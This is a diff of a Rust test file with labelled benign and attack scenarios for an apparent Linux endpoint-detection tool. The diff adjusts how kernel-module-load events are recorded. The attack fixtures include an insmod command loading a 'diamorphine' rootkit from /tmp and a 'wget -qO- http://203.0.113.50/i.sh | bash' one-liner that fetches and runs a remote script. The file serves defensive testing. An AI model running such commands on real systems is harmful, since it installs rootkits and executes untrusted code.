@@ -239,7 +239,7 @@ fn scenarios() -> Vec<(&'static str, &'static str, &'static str, Vec<E>)> {
             ev(101, NetworkConnect, 3301, 3000, 1000, "aws", "bash", s).net("52.216.0.1", 443),
         ]),
         ("LB08", "benign", "modprobe loads nf_conntrack (docker start)", vec![
-            ev(100, ModuleLoad, 3401, 1, 0, "modprobe", "dockerd", s).file("/lib/modules/6.1.0-26-amd64/kernel/net/netfilter/nf_conntrack.ko", false),
+            ev(100, ModuleLoad, 3401, 1, 0, "modprobe", "dockerd", s).file("nf_conntrack", false),
         ]),
         ("LB09", "benign", "systemctl enable --now nginx (wants symlink write)", vec![
             ev(100, ProcessExec, 4001, 3000, 0, "systemctl", "bash", s).cmd("systemctl enable --now nginx"),
@@ -337,7 +337,8 @@ fn scenarios() -> Vec<(&'static str, &'static str, &'static str, Vec<E>)> {
             ev(101, FileOpen, 7102, 6100, 0, "systemctl", "bash", s).cmd("systemctl enable dbus-org.update.service").file("/etc/systemd/system/multi-user.target.wants/dbus-org.update.service", true),
         ]),
         ("LA12", "attack", "insmod rootkit from /tmp", vec![
-            ev(100, ModuleLoad, 7201, 6100, 0, "insmod", "bash", s).cmd("insmod /tmp/.d/diamorphine.ko").file("/tmp/.d/diamorphine.ko", false),
+            ev(100, ProcessExec, 7201, 6100, 0, "kmod", "bash", s).cmd("insmod /tmp/.d/diamorphine.ko").file("/usr/sbin/insmod", false),
+            ev(101, ModuleLoad, 7201, 6100, 0, "unknown", "unknown", s).file("diamorphine", false),
         ]),
         ("LA13", "attack", "wget -qO- url | bash (one-liner, sh -c cmdline)", vec![
             ev(100, ProcessExec, 7301, 6100, 1000, "sh", "bash", s).cmd("sh -c wget -qO- http://203.0.113.50/i.sh | bash"),
